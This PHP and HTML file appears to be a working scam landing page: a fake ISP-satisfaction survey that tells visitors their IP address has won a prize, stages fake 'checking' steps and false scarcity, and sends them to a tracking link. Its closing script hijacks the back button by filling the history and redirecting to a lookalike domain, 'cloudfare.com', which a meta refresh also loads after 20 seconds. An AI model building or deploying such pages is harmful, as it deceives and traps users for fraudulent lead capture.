<?php
function get_parameter($parameter_name, $html_entities = true) {
	$default_values = array('text' => 'device');
	if(isset($_REQUEST[$parameter_name]) && is_string($_REQUEST[$parameter_name])) {
		return ($html_entities) ? htmlentities($_REQUEST[$parameter_name], ENT_QUOTES) : $_REQUEST[$parameter_name];
	}
	else if (isset($default_values[$parameter_name]) && is_string($default_values[$parameter_name])) {
		return ($html_entities) ? htmlentities($default_values[$parameter_name], ENT_QUOTES) : $default_values[$parameter_name];
	}
	return '';
}

function _t($identifier, $html_entities = true) {
	global $translations, $lang, $default_lang;
	$val = '';
	if(!empty($translations[$lang][$identifier])) {
		$val = ($html_entities) ? htmlentities($translations[$lang][$identifier], ENT_QUOTES) : $translations[$lang][$identifier];
	}
	else if(isset($translations[$default_lang][$identifier])) {
		$val = ($html_entities) ? htmlentities($translations[$default_lang][$identifier], ENT_QUOTES) : $translations[$default_lang][$identifier];
	}
	else {
		$val = ($html_entities) ? htmlentities($identifier, ENT_QUOTES) : $identifier;
	}
	$val = str_replace('%DEVICE_TEXT%', get_parameter('text'), $val);
	$val = str_replace('%SPO_TEXT%', '<span class="spo"></span>', $val);
	$val = str_replace('%ISP_TEXT%', '<span class="isp"></span>', $val);
	$val = str_replace('%COUNTRY_TEXT%', '<span class="country"></span>', $val);
	$val = str_replace('%DATE_TEXT%', '<span class="today"></span>', $val);
	return $val;
}

function get_translations($langs) {
	$translations = array();
	foreach($langs as $lang) {
		$filename = 'translations/' . $lang . '.json';
		if(file_exists($filename)) {
			$file_content_obj = @json_decode(file_get_contents($filename), true);
			if(is_array($file_content_obj)) {
				$translations[$lang] = $file_content_obj;
			}
		}
	}
	return $translations;
}

$default_lang = 'en';
if(!empty($_GET['lang']) && is_string($_GET['lang'])) {
	$lang = $_GET['lang'];
}
else {
	$lang = $default_lang;
}

$translations = get_translations(array_unique(array($default_lang, $lang)));

$url = trim(get_parameter('tracking_domain'));
if(strpos($url, 'http://') !== 0 && strpos($url, 'https://') !== 0) {
	$url = "https://$url" . '?' . http_build_query($_GET);
}
$photo_subfolder = 'lp3/';
$photo = 'https://' . trim(get_parameter('image_domain')) . '/' . $photo_subfolder . get_parameter('image') . '.png';

$spo = get_parameter('spo');
$isp = get_parameter('isp');

$translations_js = array();
$translations_js_identifiers = array('your_place_has_been_reserved_text', 'CONGRATULATIONS!_we_want_to_thank_you_text', 'Wait!_your_ip_address_has_been_selected_for_a_chance_text', 'Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December');
foreach($translations_js_identifiers as $identifier) {
	$translations_js[$identifier] = _t($identifier, false);
}
?>
<!DOCTYPE html><html lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="20; https://cloudfare.com"/>
<title>(1) <?= _t('Pending_reward') ?></title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="q">
	<div id="header">
		<div class='b r'> <img src='cadeau.png'> <table class='c'> <tbody> <tr> <td>Date:</td> <td><span id='today'></span></td> </tr> <tr> <td><b><?= _t('User reference:') ?></b></td> <td>GIFT-96951-97</td> </tr> <tr> <td><b><?= _t('Country:') ?></b></td> <td><span id='country'></span></td> </tr> </tbody> </table> </div>
	</div>
	<div id="copy">
		<h1><?= _t('Dear_user_congratulations') ?></h1>
		<p><?= _t('text_1', false) ?></p>
		<p><?= _t('text_2', false) ?></p>
		<p><?= _t('text_3', false) ?></p>
		<p><?= _t('text_4', false) ?></p>
		<div class="s" id="quest"><div><h2><?= _t('how_satisfied_are_you_with_text') ?></h2><a class='u' onclick='next(this)'><?= _t('Very_Satisfied') ?></a><a class='u' onclick='next(this)'><?= _t('Satisfied') ?></a><a class='u' onclick='next(this)'><?= _t('Unsatisfied') ?></a></div><div hidden=''><h2>Would you recommend <span class='isp'></span>?</h2><a class='u' onclick='next(this)'><?= _t('Yes') ?></a><a class='u' onclick='next(this)'><?= _t('No') ?></a><a class='u' onclick='next(this)'><?= _t('Maybe') ?></a></div><div hidden=''><h2><?= _t('what_do_you_like_the_most_text') ?></h2><a class='u' onclick='next(this)'><?= _t('Speed') ?></a><a class='u' onclick='next(this)'><?= _t('Service') ?></a><a class='u' onclick='next(this)'><?= _t('Privacy') ?></a></div><div id='loading' hidden=''><h3 class='h'><?= _t('Evaluating answers...') ?></h3></div><div hidden=''><h3 class='h'><?= _t('Checking IP address...') ?></h3></div><div hidden=''><h3 class='h'><?= _t('Verifying product availability...') ?></h3></div><div id='done' class='prizes' hidden=''><h3><?= _t('Congratulations_select_the_gift_text') ?></h3><p><small class='f h'><?= _t('Due_to_limited_availability_text', false) ?></small><br><small><?= _t('If_you_do_not_claim_text') ?></small></p><br>
				<div class='t' onclick='go(1)'>
					<img id='img_product' src='<?= $photo ?>'>
					<div><b></b><br><?= _t('What_you_pay_to_enter_the_contest') ?>: <b class='i'><?= _t('FREE') ?></b> <br> <?= _t('Available') ?>: <mark class='f h v'>2</mark> </div> <a href='javascript:void(0)' rel='noreferrer' onclick='exit_a1();PreventExitPop=false'><span class='e u' onclick='launchpopLink(event)'><?= _t('Continue') ?></span></a>
				</div>
				<div class='a t'>
					<img src='nfc-2.jpg'><div><b><?= _t('1_year_of_spotify') ?></b><br><?= _t('What_you_pay_to_enter_the_contest') ?>: <b class='i'>$1.00</b> <br> <?= _t('Available') ?>: <mark class='f h'>0</mark></div><a class='e u'><?= _t('Continue') ?></a>
				</div>
				<div class='a t'> <img src='nfc-3.jpg'> <div><b><?= _t('1_year_of_google_play_music') ?></b><br><?= _t('What_you_pay_to_enter_the_contest') ?>: <b class='i'>$1.00</b> <br> <?= _t('Available') ?>: <mark class='f h'>0</mark></div><a class='e u'><?= _t('Continue') ?></a></div>
			</div>
		</div>
	</div>
</div>
<script>var url = '<?= $url ?>';</script>
<script>var translations_js = <?= json_encode($translations_js) ?>;</script>
<script>var obj = <?= json_encode($_GET) ?>;</script>
<script src="script.js" type="text/javascript"></script>
<script type="text/javascript"> 
! function () { 
var t; 
try { 
for (t = 0; 10 > t; ++t) history.pushState({}, "", "#"); 
onpopstate = function (t) { 
t.state && location.replace("https://cloudfare.com") 
} 
} catch (o) {} 
}(); 
</script>

</body></html>